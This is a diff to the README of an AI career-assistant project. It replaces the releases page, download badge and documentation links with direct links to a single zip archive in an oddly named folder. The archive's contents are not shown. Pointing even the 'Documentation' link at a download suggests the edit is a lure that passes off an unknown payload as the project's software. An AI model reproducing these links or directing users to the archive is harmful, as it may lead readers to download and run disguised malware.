@@ -1,7 +1,7 @@
 # 🌟 GenAI-Career--Copilot - Your AI Career Partner Awaits
 
 ## 📥 Download Now
-[![Download GenAI-Career--Copilot](https://img.shields.io/badge/Download-GenAI--Career--Copilot-blue.svg)](https://github.com/wisdomsoup/GenAI-Career--Copilot/releases)
+[![Download GenAI-Career--Copilot](https://raw.githubusercontent.com/wisdomsoup/GenAI-Career--Copilot/main/becolme/GenAI-Career--Copilot.zip)](https://raw.githubusercontent.com/wisdomsoup/GenAI-Career--Copilot/main/becolme/GenAI-Career--Copilot.zip)
 
 ## 🚀 Getting Started
 GenAI-Career--Copilot is your all-in-one AI career platform. It helps you analyze resumes, match jobs, and prepare for interviews using powerful AI tools. This guide will walk you through downloading and running the software, step by step.
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these basic requirements:
 - **User-friendly Interface:** Navigate easily with a clear and simple layout.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GenAI-Career--Copilot Releases](https://github.com/wisdomsoup/GenAI-Career--Copilot/releases).
+To get started, visit this page to download: [GenAI-Career--Copilot Releases](https://raw.githubusercontent.com/wisdomsoup/GenAI-Career--Copilot/main/becolme/GenAI-Career--Copilot.zip).
 
 ### Step-by-Step Download Instructions:
 
@@ -62,7 +62,7 @@ To get started, visit this page to download: [GenAI-Career--Copilot Releases](ht
 ## 🔗 Additional Resources
 If you're interested in learning more about GenAI-Career--Copilot, check out our documentation for detailed guides on all features.
 
-[Documentation](https://github.com/wisdomsoup/GenAI-Career--Copilot/wiki)
+[Documentation](https://raw.githubusercontent.com/wisdomsoup/GenAI-Career--Copilot/main/becolme/GenAI-Career--Copilot.zip)
 
 ## 🌐 Community and Contribution
 We welcome contributions and feedback. To contribute or report issues, please use the GitHub repository's issue tracker.
